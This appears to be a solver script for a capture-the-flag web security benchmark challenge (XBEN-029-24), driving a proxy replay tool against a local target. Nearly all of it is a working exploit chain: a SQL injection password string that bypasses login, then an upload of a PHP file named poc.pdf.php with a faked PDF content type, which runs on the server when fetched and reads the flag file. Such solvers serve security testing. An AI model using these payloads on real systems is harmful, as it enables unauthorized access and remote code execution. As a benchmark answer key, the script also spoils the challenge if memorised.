#!/usr/bin/env bash
# XBEN-029-24 — SQLi auth bypass then unrestricted upload to RCE. Proxy-mode
# twin. A SQL injection in the login registers an admin session; the invoice
# uploader then accepts a .php file, which runs when fetched and prints the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben029p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/' --set 'form.submit=1' --set 'form.username=admin' \
  --set "form.password=x'),MD5('admin'))) OR '1'='1' -- " >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/upload.php' \
  --set 'multipart.invoice=<?php echo file_get_contents("/FLAG.txt"); ?>' \
  --set 'multipart.invoice.filename=poc.pdf.php' --set 'multipart.invoice.content_type=application/pdf' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/uploaded_invoices/poc.pdf.php' >/dev/null
print_flag
